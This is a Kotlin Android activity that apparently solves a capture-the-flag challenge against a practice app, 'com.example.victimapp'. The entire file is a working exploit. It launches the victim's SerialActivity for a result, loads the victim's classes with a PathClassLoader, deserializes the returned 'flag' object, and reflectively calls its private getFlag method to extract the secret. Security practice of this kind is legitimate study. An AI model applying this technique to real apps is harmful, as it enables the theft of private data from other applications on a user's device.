package com.ennio.serialintent

import android.app.Activity
import android.content.ComponentName
import android.content.ContentValues.TAG
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import dalvik.system.PathClassLoader
import java.io.Serializable

class MainActivity : AppCompatActivity() {
    val getResult =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                val intent = result.data
                if (intent != null) {
                    try {
                        val apkPath = packageManager.getApplicationInfo("com.example.victimapp", 0).sourceDir
                        val victimLoader = PathClassLoader(apkPath, classLoader)

                        intent.setExtrasClassLoader(victimLoader)
                        val extras: Bundle? = intent.extras
                        val serialExtra = extras?.getSerializable("flag")

                        val flag = extractFlag(serialExtra)
                        Log.d(TAG, "FLAG CAPTURED: $flag")
                    } catch (e: PackageManager.NameNotFoundException) {
                        Log.e(TAG, "Required app 'com.example.victimapp' not installed.", e)
                    } catch (t: Throwable) {
                        Log.e(TAG, "Failed to extract flag from intent", t)
                    }
                }
            }
        }

    fun extractFlag(flagContainer: Serializable?): String {
        val clazz = flagContainer?.javaClass
        val getFlagMethod = clazz?.getDeclaredMethod("getFlag")
        getFlagMethod?.isAccessible = true
        val flag = getFlagMethod?.invoke(flagContainer)
        return (flag as? String) ?: ""
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        val intent = Intent()
        val serialActivity =
            ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity")
        intent.setComponent(serialActivity)
        getResult.launch(intent)
    }
}
